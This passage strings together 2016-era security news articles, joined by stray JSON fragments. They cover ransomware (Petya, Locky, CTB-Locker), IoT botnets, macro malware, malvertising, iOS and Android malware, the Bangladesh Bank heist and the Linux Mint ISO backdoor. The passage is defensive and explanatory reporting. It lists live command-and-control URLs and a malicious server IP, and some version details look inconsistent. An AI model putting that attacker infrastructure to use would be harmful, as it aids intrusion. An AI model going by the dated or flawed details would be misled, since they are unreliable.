admitted that his tool does not guarantee 100 percent result and that it could be circumvented by malicious hackers who can discover a way to bypass RansomWhere and avoid detection, it is always better to be somewhat safer than completely vulnerable. Some known Limitations of RansomWhere tool?: RansomWhere would not be able to help if any Ransomware malware abuses Apple-signed file or app. RansomWhere detects ransomware infections after they have already encrypted some of your important files. Files outside of your home directory are not protected by RansomWhere. So sophisticated ransomware could shift all your files outside home directory and lock them up. Since hackers are always a step ahead of researchers, the RansomWhere tool has already been bypassed. Vilaca had tweaked his Gopher ransomware to bypass RansomWhere in a matter of minutes. As mentioned in the limitations, Vilaca added just ten lines of code in its ransomware proof-of-concept to take the victim's files outside of the home directory and lock them up. You can watch the video above showing his hack." }

The Ransomware infections have become so sophisticated with the time that victims end up paying ransom in order to get their critical and sensitive data back. But if you are infected with Petya Ransomware, there is good news for you. You can unlock your infected computer without paying the hefty ransom. Thanks to the Petya author who left a bug in the Ransomware code. What is Petya Ransomware? Petya is a nasty piece of ransomware that emerged two weeks ago and worked very differently from any other ransomware. The ransomware targets the victims by rebooting their Windows computers, encrypting the hard drive's master boot file, and rendering the master boot record inoperable. Also Read: How to Decrypt CoinVault and Bitcryptor Ransomware A master boot record (MBR) is the information in the first sector of any hard disk that identifies how and where an OS is located while a master boot file is a file on NTFS volumes that includes the name, size, and location of all other files. Once done, the infected PC restarts and the Petya ransomware code is booted rather than the operating system, displaying a ransom note that demands 0.9 Bitcoin (approx. US$381) in exchange for the decryption key to recover the system's files. Now, without the decryption password, the infected PC would not boot up, making all files on the startup disk inaccessible. However, a researcher who goes by the Twitter handle @leostone has developed a tool that generates the key Petya requires decrypting the master boot file. Here's How to Unlock your Petya-infected Files for Free The researcher discovered a weakness in the nasty malware's design after Petya infected his father-in-law's PC. According to security researcher Lawrence Abrams from the Bleeping Computer, the key generator tool developed by Leostone could unlock a Petya-encrypted PC in just 7 seconds. In order to use the Leostone's password generator tool, victims must remove the startup drive from the Petya affected computer and connect it to another Windows computer that's not infected. The victim then needs to extract data from the hard disk, specifically: the base-64-encoded 512 bytes that start at sector 55 (0x37h) with an offset of 0. the 64-bit-encoded 8-byte nonce from sector 54 (0x36) offset 33 (0x21). This data then needs to be used on this Web app (mirror site) created by Leostone to generate the key. The victim will then retrieve the key Petya used to decrypt the crucial file. Here's a Simple Tool to Unlock your Files For Free Since the Leostone's tool is not a straight-forward method, extracting the encrypted data is not easy for many victims. The good news is that Fabian Wosar, a separate researcher, has created a free tool called the Petya Sector Extractor that can be used to easily extract the data in seconds. In order to use Petya Sector Extractor, victims must run the tool on the uninfected Windows computer that is connected to the infected hard drive from the affected computer. Abrams provided this step-by-step tutorial that will walk victims through the entire process. Also Read: Here's How to Decrypt Hydracrypt & Umbrecrypt Ransomware This is a great solution to decrypt your infected files, but most likely, the Petya authors have already heard about this tool and are modifying their code to disable the solution. So, there is no guarantee the tool will continue to work indefinitely." }

Recently, independent security researcher Mike Olsen discovered that the CCTV surveillance devices sold on Amazon came with pre-installed malware. Olsen discovered this nasty secret after he bought a set of outdoor CCTV surveillance cameras from Amazon for one of his friends. He picked Sony Chip HD 6 Camera 1080P PoE IP CCTV surveillance camera kit sold by the Urban Security Group (USG) on Amazon, as it had good reviews and was a relatively cheap set of 6 cameras with all necessary equipment included. While helping his friend set up the cameras, Olsen logged into the administrator panel to configure the surveillance system and found that the page hosted \"no normal controls or settings.\" Assuming that it might be bad programming, Olsen opened up the browser's developer tools and was surprised to discover a hidden iFrame loaded at the bottom of the body tag, retrieving content from Brenz.pl. Surveillance Camera Comes Pre-Installed with Malware A quick Google search revealed that the Brenz.pl domain was used in malware distribution campaigns, according to a blog post by cyber-security vendor Sucuri in 2011. In short, this means that the newly bought surveillance camera kit could be infected with malware anytime, when the Brenz.pl operator decides to push malicious code to the DVR's backend through the hidden iFrame. Once the CCTV camera's operator accessed that page, the malware would be downloaded and installed, potentially leading to unlawful spying and data theft. Since the Breza.pl domain was already on the firmware, there might be other nasty malware included in the firmware as well, that does not provide the camera's owner to access the backend. The malware distributed by the surveillance cameras can have the ability to hijack video feeds or make the customer's cameras part of a DDoS Botnet, something that happened last year. So be careful what you buy. Check reviews of every product before buying, even if the product brand and the eCommerce platform is trusted." }

Hackers have already been targeting Flash Player for long by exploiting known vulnerabilities roaming in the wild. Despite Adobe's efforts, Flash is not safe anymore for Internet security, as one more critical vulnerability had been discovered in the Flash Player that could crash the affected system and potentially allow an attacker to take control of the system. Discovered by a French Researcher Kafeine, FireEye's Genwei Jiang, and Google's Clement Lecigne, the flaw affects Adobe Flash Player 21.0.0.197 and its earlier versions for Windows, Macintosh, Linux and Chrome OS. The vulnerability, assigned under CVE-2016-1019, also expands back to Windows 7 and even towards Windows XP. Adobe had also confirmed that the newly discovered vulnerability in its Flash Player is being exploited actively in the wild. Update Adobe Flash Player Software This issue caused the Adobe engineers to urgently work on a mitigation method and release an emergency update under Flash Player 21.0.0.182, which is expected to get released this Thursday. Usually, Adobe releases its patch on the second Tuesday of the month, the same day as Microsoft, but rolls out emergency patches on an ad hoc basis, analyzing the seriousness of the bug. The endless Adobe updates and upgrades had failed to ensure the user security in the real time scenario. So it's high time for users to disable or completely uninstall Adobe Flash Player. Believe or not, Adobe Flash Player is dead and its time has passed. In January last year, YouTube moved away from Flash for delivering videos. Although in between Flash made an effort to beef up its security in a bid to justify its existence, things got a bit heated when Firefox became aware of a critical bug and blocked the Flash plugin entirely. Facebook’s Security Chief publicly called for Adobe to announce a kill date for Flash. In fact, Google Chrome has also begun blocking auto-playing Flash ads by default." }

The market fragmentation of IoTs or Internet-connected devices is a security nightmare, due to poor security measures implemented by their vendors. Now, the researchers at security firm ESET have discovered a piece of Malware that is targeting embedded devices such as routers, and other connected devices like gateways and wireless access points, rather than computers or smartphones. Dubbed KTN-Remastered or KTN-RM, the malware is a combination of both Tsunami (or Kaiten) as well as Gafgyt. Tsunami is a well-known IRC (Internet Relay Chat) bot used by miscreants for launching Distributed Denial of Service (DDoS) attacks while Gafgyt is used for Telnet scanning. KTN-RM, which researcher dubbed 'Remaiten,' features an improved spreading mechanism by carrying downloader executable binaries for embedded platforms and other connected devices. How Does the Linux Malware Work? The malware first performs Telnet scanning to look for routers and smart devices. Once the connection is made, the malware tries to guess the login credentials in an effort to take over weakly-secured devices. If it successfully logs in, the malware will issue a shell command to download bot executable files for multiple system architectures before running them on the compromised networking kit. \"This is a simple but noisy way of ensuring that the new victim gets infected because it is likely that one of the binaries is for the current platform,\" explained ESET Malware Researcher Michal Malík. \"It targets mainly those with weak login credentials.\" The malware, version 2.0, also has a welcome message for those who might try to neutralise its threat, containing a reference to the Malware Must Die blog. Perhaps it is a way to take revenge, as Malware Must Die has published extensive details about Gafgyt, Tsunami and other members of this Malware family. For more technical details about KTN-RM or Remaiten, you can head on to ESET's official blog post published Wednesday." }

If yes, then are you aware that even opening a simple doc file could compromise your system? It is a matter to think that the virus does not directly affect you, but it is you who let the virus carry out the attack by enabling deadly \"Macros\" to view the doc contents that are generally on eye-catching subjects like bank invoice. How Macros are Crippling your System? The concept of Macros dates back to 1990s. You must be familiar with this message: \"Warning: This document contains macros.\" A Macro is a series of commands and actions that help to automate some tasks. Microsoft Office programs support Macros written in Visual Basic for Applications (VBA), but they can also be used for malicious activities like installing malware. Hackers are cleverly using this technique on the shade of social engineering by sending the malicious Macros through doc file or spreadsheet with an eye-catching subject in the mail to the corporate networks. Once a user opens the malicious Word document, the doc file gets downloaded to its system. However, danger comes in when the user opens the file, and a popup window appears that states \"Enable Editing\" to view the content. Once the users click Enable Editing, the malicious file then begins to perform the notorious activities in the system such as to get embedded into other doc files to proliferate the attacking rate that results in crippling your system network. All those actions would depend upon payload program defines inside the Macro. Dridex and Locky are Warning Bells!!! No other incidents could get you the clear picture on the potential threat of Macro viruses apart from Dridex Malware and Locky Ransomware. Both malware had made use of the malicious Macros to hijack systems. Over 20 Million Euro had been stolen from the UK banks with the Dridex Malware, which got triggered via a nasty macro virus. The infectious bar of Locky ransomware had also seen an exponential growth in a couple of hours. How to Protect Yourself from Macro-based Malware? Step 1: Configure Trusted Location Since disabling Macros is not a feasible option, especially in an office environment where Macros are designed to simplify the complex task with automation. So, if your organization relies on Macros, you can move files that use Macros into the company’s DMZ (Demilitarized Zone), also called Trusted Location. To configure the trusted location, you can navigate via: User Configuration/Administrative Templates/Microsoft Office XXX 20XX/Application Settings/Security/Trust Center/Trusted Locations Once configured, the Macros that does not belong to the trusted location would not run in any way, beefing up your system’s security. Step 2: Block Macros in Office Files that came from the Internet Microsoft had recently unveiled a novel method by implementing a new tactical security feature to limit the Macro execution attack in MS Office 2016, ultimately preventing your system from hijacking. The new feature is a group policy setting that lets enterprise administrators to disable macros from running in Office files that come from the Internet. The new setting is called, \"Block macros from running in Office files from the Internet\" and can be navigated through the group policy management editor under: User configuration > Administrative templates > Microsoft Word 2016 > Word Options > Security > Trust Center It can be configured for each Office application. By enabling this option, macros that come from the Internet are blocked from running even if you have 'enable all macros' in the Macros Settings. Moreover, instead of having the option to 'Enable Editing,' you'll receive a notification that macros are blocked from running, as the document comes from an Untrusted Source. The only way to run that particular Office file is to save it to a trusted location, allowing macros to run." }

Dubbed USB Thief ( or Win32/PSW.Stealer.NAI), the malware has the capability of stealthy attacking against air-gapped or isolated computers, warns ESET security firm. The malware author has employed special programs to protect the USB Thief from being reproduced or copied, making it even harder to detect and reverse-engineer. USB Thief has been designed for targeted attacks on computer systems that are isolated from the Internet, according to the ESET malware analyst Tomáš Gardoň. The 'USB Thief' Trojan Malware The USB Thief Trojan malware is stored either as a portable application's plugin source or as a Dynamically Linked Library (DLL) used by the portable application. Since USB devices often store popular applications like Firefox, Notepad++ or TrueCrypt portable, once any of these applications is executed, the malware starts running in the background. USB Thief is capable of stealing data from air-gapped systems – systems that are isolated from the Internet and other external networks. \"Well, taking into account that organizations isolate some of their systems for a good reason,\" explained Peter Stancik, the security evangelist at ESET. \"Any tool capable of attacking these so called air-gapped systems must be regarded as dangerous.\" The malware runs from a USB removable device, so it don’t leave any traces of its activities, and thus, victims do not even notice that their data had been stolen. Since the malware is bound to a single USB device, it prevents USB Thief from leaking from the infected computers. Besides this, USB Thief utilizes a sophisticated implementation of multi-staged encryption that makes the malware harder to detect and analyse. \"This is not a very common way to trick users, but very dangerous,\" Stancik said. \"People should understand the risks associated with USB storage devices obtained from sources that may not be trustworthy.\" Here's How you can Protect from being Infected: Do not use USB storage devices from non-trustworthy sources.

Here's what Happens to Users when Clicking Ads on these Big Brand Sites: The advertisements on the legit sites trick users into clicking on it, making them believe that these circulated ads come from a trusted networks. Once clicked, the malicious Ad redirects the user to a malicious website that hosts Angler Exploit Kit (AEK) to infect visitors by installing malware and ransomware on their computer. Angler Exploit Kit includes many malicious hacking tools and zero-day exploits that let hackers execute drive-by attacks on visitors' computers. In this case, the Angler kit scans for the vulnerable PCs and loads Bedep Trojan and TeslaCrypt Ransomware, opening doors for hackers to further install a variety of malicious programs. Buying Media-Related Domains to Spread Malicious Campaigns While conducting the background check, the security firm discovered that cyber criminals behind this advertising campaign made use of an expired website domain of Brentsmedia, an online marketing solution who discontinued their service earlier 2016. According to the web registrar records, Brentsmedia's domain was purchased by Pavel G Ashtahov on March 6th, the day just before the malvertising campaign kickstarted. Detailed analysis of this mischievous Ad campaign revealed that when a user tends to click on the malwertized Ad, it triggers a JSON file (Javascript Object Notation), which contains a list of security products for cross checking their presence in the victim's system. If any of the pre-defined products found installed, the malvertising Ads avoid loading the malicious payload to evade the detection by antivirus firms that could block the campaign if detected. But if not present, it will carry out the exploitation in a stealth mode, ultimately redirecting the user to the malicious page. The Intensity of the Malvertising! According to the researchers telemetry, these malicious Ads were delivered through two affiliate networks namely Adnxs, which has already resolved the issue, and Taggify, which has not paid any attention to the seriousness of the problem. Two more expired media-related domains exhibiting the same characteristics as brentsmedia[.]com: \"envangmedia[.]com\" and \"markets.shangjiamedia[.]com\", shows that another similarly named domain has already been registered. So there might be a possibility of hijacking \"media\" related branded domains for running malvertising campaigns, as a new generation threat to the global leaders." }

And now: Hackers have discovered a new way to install malicious apps onto your iPhone without your interaction. Researchers at Palo Alto Networks have uncovered a new strain of malware that can infect Non-Jailbroken (factory-configured) iPhones and iPads without the owner's knowledge or interaction, leaving hundreds of millions of Apple iOS devices at risk. Dubbed AceDeceiver, the iPhone malware installs itself on iOS devices without enterprise certificates and exploits designing flaws in Apple's digital rights management (DRM) protection mechanism called FairPlay. What's more concerning about this malware: Unlike most iOS malware, AceDeceiver works on factory-configured (non-jailbroken) iOS devices as well. FairPlay is an Apple's software program that prevents people from stealing purchased apps from its official App Store. However, with the help of AceDeceiver's \"FairPlay Man-in-the-Middle (MITM) technique,\" hackers can install malicious apps on your iPhone even without your knowledge, simultaneously bypassing Apple's other security defenses. According to researchers, the FairPlay Man-In-The-Middle (MITM) technique has been in use since 2013, as a way to distribute pirated iOS apps. \"In the FairPlay MITM attack, attackers purchase an app from App Store then intercept and save the authorization code,\" Claud Xiao from Palo Alto Networks explains in a blog post. \"They then developed PC software that simulates the iTunes client behaviors, and tricks iOS devices to believe the app was purchased by the victim.\" However, this is the first time the FairPlay technique has been used to spread malware on iOS devices, as the creator of the pirated software can install potentially malicious apps without your knowledge. Currently, the malicious behaviors related to AceDeceiver has been spotted in China, but researchers warn that the malware could be easily configured to target iPhone users of other geographic regions as well.

Few days ago, reports emerged of a group of unknown hackers that broke into Bangladesh's central bank, obtained credentials needed for payment transfers from Federal Reserve Bank of New York and then transferred large sums to fraudulent accounts based in the Philippines and Sri Lanka. The criminal group was able to steal a total value of about $81 Million from the Federal Reserve's Bangladesh account through a series of fraudulent transactions, but a typo in some transaction prevented a further $850 Million Heist. However, the question was still there: How the Hackers managed to transfer $80 Million without leaving any Trace? Security researchers from FireEye's Mandiant forensics are helping the Dhaka investigators to investigate the cyber heist. Investigators believe unknown hackers installed some type of malware in the Bangladesh central bank's computer systems few weeks before the heist and watched how to withdraw money from its United States account, Reuters reports. Although the malware type has not been identified, the malicious software likely included spying programs that let the group learn how money was processed, sent and received. The malware in question could be a potential Remote Access Trojan (RAT) or a similar form of spyware that gave attackers the ability to gain remote control of the bank's computer. The investigators suspect the hack could have exploited a \"zero-day\" flaw as they are unknown to vendors as well. After this, the hackers were able to steal the Bangladesh Bank's credentials for the SWIFT messaging system, a highly secure financial messaging system utilized by banks worldwide to communicate with each other. \"SWIFT and the Central Bank of Bangladesh are working together to resolve an internal operational issue at the central bank,\" Belgium-based SWIFT said in a statement Friday. \"SWIFT's core messaging services were not impacted by the issue and continued to work as normal.\" Security experts hope that the malware sample will be made available to the security researchers soon so that they can determine whether the sample was truly advanced, or if Bangladesh Central Bank's security protection was not robust enough to prevent the hack. The Bangladesh Bank discovered weaknesses in its systems, which could take years to repair the issues though the Federal bank has denied any system compromise." }

Now, another genre of ransomware had been branched out from the family of CTB-Locker Ransomware with an update to infect Websites. The newly transformed ransomware dubbed \"CTB-Locker for Websites\" exclusively hijacks the websites by locking out its data, which would only be decrypted after making a payment of 0.4 BTC. This seems to be the very first time when any ransomware has actually defaced a website in an attempt to convince its administrator to comply with the ransom demand. However, the infected website admins can unlock any 2 files by the random generator for free as a proof of decryption key works. Here's How CTB-Locker for Websites Ransomware Works Lawrence explained that CTB-Locker ransomware replaces the index page (the original index.php or index.html) of the servers hosting websites with the attacker's defacement page (a new affected index.php). The defacement page serves a message informing the site owners that their files have been encrypted, and they need to pay a ransom before a certain deadline. Once encrypted, the compromised websites display the following message: \"Your scripts, documents, photos, databases and other important files have been encrypted with strongest encryption algorithm AES-256 and unique key, generated for this site.\" The message also contains a step-by-step guide that helps the CTB-Locker victims to make the payment to a specific Bitcoin address. FREE Key to Decrypt Any 2 Random Files Soon after gaining the website control, the ransomware attacker submits two different AES-256 decryption keys to the affected index.php. The first key would be used to decrypt any 2 random files from the locked files for free under the name of \"test\" which are chosen to demonstrate the decryption procedure. Once the site administrator enters the filename and hit \"Decrypt for Free,\" jquery would be fired up upon the request to test the decryption key in a C&C Server. When the key is received, it'll decrypt any 2 random files and display 'Congratulations! TEST FILES WAS DECRYPTED!!' The other decryption key would be the one to decrypt rest of the seized files, after making the payment in Bitcoin to the attacker. All the website's content would be encrypted using an AES-256 algorithm, and a unique ID would be generated for each infected website. Nearly all possible types of files extensions are being affected by CTB-Locker Ransomware. Live Session with Ransomware Attackers Another unique characteristic of the ransomware is giving victims the ability to exchange messages with the ransomware attackers, noted by Lawrence in his blogpost. The ransomware developers have organized a chat room in such a way that the victims could talk with the ransomware creators after the specifying name of the secret file which is present in the same directory with index.php. CTB Locker for Website → Modifies Packages in the Server The CTB-Locker for Website package utilizes a variety of files described below: index.php : The Main component of CTB-Locker for Websites and contains the encryption and decryption routines as well as the payment page. allenc.txt : Contains a list of all encrypted files. test.txt : Contains the path and filenames to two prechosen files that can be decrypted for free. victims.txt : It contains a list of all files that are to be encrypted. However, the files that are already encrypted will remain in this list. extensions.txt - The list of file extensions that should be encrypted. secret_[site_specific_string] : The secret file used by the Free Decrypt and Chat functions and is located in the same folder as the index.php file. Command and Control Server Location: According to Benkow Wokned (@benkow_), a security researcher who discovered CTB-Locker for Website, found that the index.php page utilizes the jQuery.post() function to communicate and POST data to the Ransomware's Command and Control (C&C) servers. Currently, there are three Command and Control servers for CTB-Locker for Websites uncovered by the researchers: http://erdeni.ru/access.php http://studiogreystar.com/access.php http://a1hose.com/access.php The ransomware also gives a timeslot for the website administrators to recover the files. However, failure to pay the BTC in time would double the ransom amount by 0.8 BTC. CTB-Locker for Windows CTB-Locker for Websites isn't the only latest development with this family of ransomware. The ransomware has come to the Windows environment by using executables code signed with a stolen certificate. Usually, the purpose of digital signature is to authenticate the public about the genuinity of the products. The certificates are provided only after a background check conducted by the Certificate Authorities (CA) like Verizon, DigiCert. But the cybercriminal group behind the CTB-Locker ransomware has tampered the genuinity of digital certificates. The executable version in the Windows of the CTB Ransomware comes with a pre-signed digital signature. Uses Encryptor Raas For Code-Signing Certificate The group behind CBT believed to had taken the advantage of Jeiphoos, another ransomware developer who lets people go to his \"Encryptor RaaS\" Tor site that provides free digital signature certificates and sign any executable using stolen code-signing certificate. The act of stealing digital signatures is not new as they are included in the frames from the past years. Hijacking a company website would economically affect the services that are being offered to users via websites, elevating the issue to another level. However, the major part lies in the POS (Point of Sale) attack, if the threat infects an e-commercial website. Currently, many websites had been compromised by \"CBT-Locker for Website.\" As per the analysis, many wordpress sites (most of the static web pages) has been found to be targeted by CBT Website Locker, according to this online blog. Since this is not a serious issue like the Locky ransomware that utilizes Macros, the website administrator can make use of the untouched mirrors (backups) to bring back the site into action." }

Along with the developments, China has long been criticized for suspected backdoors in its products: Xiaomi and Star N9500 smartphones are top examples. Now, Chinese Internet Service Providers (ISPs) have been caught red-handed for injecting Advertisements as well as Malware through their network traffic. Three Israeli researchers uncovered that the major Chinese-based ISPs named China Telecom and China Unicom, two of Asia's largest network operators, have been engaged in an illegal practice of content injection in network traffic. Chinese ISPs had set up many proxy servers to pollute the client's network traffic not only with insignificant advertisements but also malware links, in some cases, inside the websites they visit. If an Internet user tries to access a domain that resides under these Chinese ISPs, the forged packet redirects the user's browser to parse the rogue network routes. As a result, the client's legitimate traffic will be redirected to malicious sites/ads, benefiting the ISPs. Here's How Malware and Ads are Injected In the research paper titled 'Website-Targeted False Content Injection by Network Operators,' the Israeli researchers wrote that the tactic has now expanded to core ISPs – the Internet companies that interconnect edge ISPs with the rest of the ISPs globally. These ISPs have set up specialized servers that monitor network traffic for specific URLs and move to alter it, no matter the end users are their customers or not. Methods of Injection: Various methods had been adopted by ISPs to infiltrate the legitimate traffic. Some of them are: 1- Out of Band TCP Injection Unlike in the past when ISPs modified network packages to inject ads, the network operators send the forged packets without dropping the legitimate ones. Interestingly, instead of interception or rewriting of network packets, cloning of HTTP response packets had been adopted by ISPs to replicate the infection. The ISP clones the legitimate traffic, modifies the clone, and then sends both packets to the desired destination. So ultimately, there are 2 packet responses generated for a single request. Hence, there is a chance of forged packet to win the race, while legit packet reaches at last. Since the cloned traffic will not always arrive at the end users before the legitimate one, the injected traffic is harder to detect. But a serious analysis with netsniff-ng would knock out the fake packets. 2) HTTP Injection HTTP is a stateless client-server protocol that uses TCP as its transport. As TCP only accepts the initial packet upon its receival and discards the second, there is a chance to receive the fake packet in first place; if infection had been taken place. Here, the user might get a response with HTTP Status Number 302 (Redirection) instead of HTTP Status Number 200 (OK) and would be re-routed to the other non-legit links. How to Identify Rogue Packets? 1) IP Identification IP identification value does contains a counter that is sequentially incremented after each sent the packet. The forged packet returns soon after making a request that masquerades as a legit packet. But the time stamp in each packet would provide enough evidence to eliminate the rogue packet. The forged packet is the one that has the largest absolute difference between its identification value and the average of the identification values of all the other packets 2) TTL (Total Time to Live) Each received packet contains an initial value set by sender that calculates the number of hops covered by the packet during the transmission. If packet is received with different number of hop counts, then it would clearly draws a line between the legit and illegit ones. The forged packet is the one that has the largest absolute difference between its TTL value and the average of TTL values of all the other packets 3) Timing Analysis Time stamp in the packet captured by the monitoring systems at the entrance to the Edge network would figure out the genuinity. The data packet with apparent time close proximity would differentiate the legitimate packets from the forged packets with unmatched arrival time. List of the Infection Groups In general, 14 different ISPs had been discovered with malicious background, and out of these 10 are from China, 2 from malaysia, and 1 each from India and United States. Following are the injection groups and their characteristics: 1. Hao – Referred the user to hao123.com itself, but using an HTTP 302 response mechanism to infect users. 2. GPWA – The genuine website of Gambling had been forged to another web domain which intelligently redirects the traffic to 'qpwa' (sometimes, public would not find the difference between 'q' and 'g'). The forged content here includes a JavaScript that refers to a resource having the same name as the one originally requested by the user, but the forged resource is located at qpwa.org registered to a Romanian citizen. 3. Duba Group – The injections in this group add to the original content of a website a colorful button that prompts the victim to download an executable from a link at the domain duba.net. The executable is flagged as malicious by several antivirus vendors. 4. Mi-img – In these injected sessions, the client, which appears to be an Android device, tries to download an application. The redirected response navigates into an online bot database that had been identified by a BotScout lookup. 5. Server Erased – In this group, the injections were identical to the legitimate response but the original value of the HTTP header 'Server' is changed. Motive Behind the Attack Both the advertising agencies and the ISPs are benefited by redirecting user's traffic to the corresponding sites. This practice would mark an increase in advertisement revenue and other profits to advertisers and ISPs. During their research, the researchers logged massive amounts of Web traffic and detected around 400 injection incidents based on this technique. Most of these events happened with ISPs in China and far east countries, even if the traffic originated from Western countries, meaning a German user accessing a website hosted in China is also susceptible to having his/her traffic injected with ads or malware. How to Mitigate? Since the companies that engage in such practices are edge ISPs - the final network providers that connect users to the Internet, users can change their Internet provider. However, the simplest way to combat this issue is for website operators to support HTTPS for their services, as all the websites that infect users are SSL-less. The sites that supply malicious URLs are not guarded by SSL Shield, making them vulnerable to carry out the illegit things. Therefore, usage of HTTPS-based websites would block such kinds of attacks, so users are advised only to stick to SSL sites. Delivering the illegit content, or redirecting the crowd to stash the cash would end up losing the public trust on the technologies." }

The banking Trojan family is known by several names; Security researchers from FireEye dubbed it SlemBunk, Symantec dubbed it Bankosy, and last week when Heimdal Security uncovered it, they dubbed it MazarBot. All the above wave of Android banking Trojans originated from a common threat family, dubbed GM Bot, which IBM has been tracking since 2014. GM Bot emerged on the Russian cybercrime underground forums, sold for $500 / €450, but it appears someone who bought the code leaked it on a forum in December 2015, the IBM X-Force team reported. What is GM Bot and Why Should You Worry about it? The recent version of GM Bot (dubbed MazarBOT) has the capability to display phishing pages on the top of mobile banking applications in an effort to trick Android users into handing over their financial credentials to the fraudsters. Besides this, the banking trojan is also capable of forwarding phone calls and intercepting SMS messages to help fraudsters bypass an additional layer of bank security mechanisms, and locking a device’s screen. Cyber criminals could also use the malware to: Spy on victims Delete data from the infected device Gain boot persistence to help survive device restart Send and Read your SMS message Make Calls to your contacts Read the phone's state Plague phone's control keys Infect your Chrome browser Change phone settings Force the phone into sleep mode Query the network status Access the Internet Wipe your device's storage (the most critical capabilities of the malware) However, someone leaked the malware source code only to boost his/her reputation on an underground forum, according to the researchers. GM Bot Android Malware Source Code for FREE Yes, the source code for GM Bot and its control panel is now accessible to cybercriminals and fraudsters for FREE. Here’s the Cherry on the Top: Besides the source code, the leader also posted a tutorial and instructions for server-side installation, which means cybercriminals can create their own versions of the malware strain to conduct online banking frauds. Though the archive file containing the source code and its control panel is password protected, the leader is offering the password only to active forum members who is approaching him. \"Those who received the password, in turn, passed it on to other, unintended users, so the actual distribution of the code went well beyond that discussion board’s member list,\" IBM cyber security evangelist Limor Kessem wrote in a blog post. Online users had started sharing the password to the archive among their friends, and in no time, the GM Bot source code was all over the hacking underground forums. GM Bot is one of the most dangerous banking trojan in the Android ecosystem and after its source code gets leaked, users are recommended to beware while banking online. How to Protect Yourself? As I previously mentioned, online users are advised to follow these steps in order to protect themselves against this kind of threat: Never open attachments from unknown sources. Never click on links in SMS or MMS messages sent to your phone. Even if the email looks legit, go directly to the source website and verify any possible updates. Go to Settings → Security → Turn OFF \"Allow installation of apps from sources other than the Play Store\" option. Always keep an up-to-date Anti-virus app on your Android devices. Avoid unknown and unsecured Wi-Fi hotspots and Keep your Wi-Fi turned OFF when not in use." }

You may have been Infected! Linux Mint is one of the best and popular Linux distros available today, but if you have downloaded and installed the operating system recently you might have done so using a malicious ISO image. Here's why: Last night, Some unknown hacker or group of hackers had managed to hack into the Linux Mint website and replaced the download links on the site that pointed to one of their servers offering a malicious ISO images for the Linux Mint 17.3 Cinnamon Edition. \"Hackers made a modified Linux Mint ISO, with a backdoor in it, and managed to hack our website to point to it,\" the head of Linux Mint project Clement Lefebvre said in a surprising announcement dated February 21, 2016. Who are affected? As far as the Linux Mint team knows, the issue only affects the one edition, and that is Linux Mint 17.3 Cinnamon edition. The situation happened last night, so the issue only impacts people who downloaded the above-mentioned version of Linux Mint on February 20th. However, if you have downloaded the Cinnamon edition or release before Saturday 20th, February, the issue does not affect you. Even if you downloaded a different edition including Mint 17.3 Cinnamon via Torrent or direct HTTP link, this does not affect you either. What had Happened? Hackers believed to have accessed the underlying server via the team's WordPress blog and then got shell access to www-data. From there, the hackers manipulated the Linux Mint download page and pointed it to a malicious FTP (File Transfer Protocol) server hosted in Bulgaria (IP: 5.104.175.212), the investigative team discovered. The infected Linux ISO images installed the complete OS with the Internet Relay Chat (IRC) backdoor Tsunami, giving the attackers access to the system via IRC servers. Tsunami is a well-known Linux ELF trojan that is a simple IRC bot used for launching Distributed Denial of Service (DDoS) attacks. Hackers vs. Linux Mint SysAdmins However, the Linux Mint team managed to discover the hack, cleaned up the links from their website quickly, announced the data breach on their official blog, and then it appears that the hackers compromised its download page again. Knowing that it has failed to eliminate the exact point of entry of hackers, the Linux Mint team took the entire linuxmint.com domain offline to prevent the ISO images from spreading to its users. The Linux Mint official website is currently offline until the team investigates the issue entirely. However, the hackers' motive behind the hack is not clear yet. \"What we don't know is the motivation behind this attack. If more efforts are made to attack our project and if the goal is to hurt us, we’ll get in touch with authorities and security firms to confront the people behind this,\" Lefebvre added. Hackers Selling Linux Mint Website's Database The hackers are selling the Linux Mint full website's database for a just $85, which shows a sign of their lack of knowledge. The hack seems to be a work of some script kiddies or an inexperienced group as they opted to infect a top-shelf Linux distro with a silly IRC bot that is considered to be outdated in early 2010. Instead, they would have used more dangerous malware like Banking Trojans. Also, even after the hack was initially discovered, the hackers re-compromised the site, which again shows the hackers' lack of experience. Here's How to Protect your Linux Machine Users with the ISO image can check its signature in an effort to make sure it is valid. To check for an infected download, you can compare the MD5 signature with the official versions, included in Lefebvre's blog post. If found infected, users are advised to follow these steps: Take the computer offline. Backup all your personal data. Reinstall the operating system (with a clean ISO) or format the partition. Change passwords for sensitive websites and emails. You can read full detail about the hack here. The official website is not accessible at the time of writing. We’ll update the story when we hear more." }

Doing so could cripple your system and could lead to a catastrophic destruction. Hackers are believed to be carrying out social engineering hoaxes by adopting eye-catching subjects in the spam emails and compromised websites to lure the victims into installing a deadly ransomware, dubbed \"Locky,\" into their systems. So if you find .locky extension files on your network shares, Congratulations! You are infected and left with just two solutions: Rebuild your PC from scratch or Pay the ransom. Locky ransomware is spreading at the rate of 4000 new infections per hour, which means approximately 100,000 new infections per day. Microsoft MACROS are Back It is hard to digest the fact that, in this 2016, even a single MS Word document could compromise your system by enabling 'Macros.' This is where the point to appreciate hacker's sheer brilliance of tactics. Locky ransomware is being distributed via Microsoft 365 or Outlook in the form of an Invoice email attachment (Word File that embeds vicious macro functions). The concept of macros dates back to 1990s. You must be familiar with this message: \"Warning: This document contains macros.\" Now macros are back, as cyber criminals discover a new way to get internet users to open Microsoft Office documents, especially Word files that allow macros to run automatically. How Does Locky Work? Once a user opens a malicious Word document, the doc file gets downloaded to its system. However, danger comes in when the user opens the file and found the content scrambled and a popup that states \"enable macros\". Here comes the bad part: Once the victim enables the macro (malicious), he/she would download an executable from a remote server and run it. This executable is nothing but the Locky Ransomware that, when started, will begin to encrypt all the files on your computer as well as network. Locky ransomware affects nearly all file formats and encrypts all the files and replace the filename with .locky extension. Once encrypted, the ransomware malware displays a message that instructs infected victims to download TOR and visit the attacker's website for further instructions and payments. Locky ransomware asks victims to pay between 0.5 and 2 Bitcoins ($208 to $800) in order to get the decryption key. One of the interesting note on Locky is that it is being translated into many languages, which heighten its attack beyond English boundaries to maximize the digital casualties. Locky Encrypts Even Your Network-Based Backup Files The new ransomware also has the capability to encrypt your network-based backup files. So it's time for you to keep you sensitive and important files in a third party storage as a backup plan in order to evade future-ransomware infections. A researcher named Kevin Beaumont initially discovered the existence of Locky encrypted virus. To check the impact of Locky, Kevin successfully intercepted the Locky traffic yesterday and realized that the cryptovirus is spreading out rapidly in the wild. \"I estimate by the end of the day well over 100,000 new endpoints will be infected with Locky, making this a genuine major cybersecurity incident — 3 days in, approximately a quarter of Million PCs will be infected,\" Kevin said in a blog post. One hour of infection Statistics: Among the highly impacted countries include Germany, Netherlands, 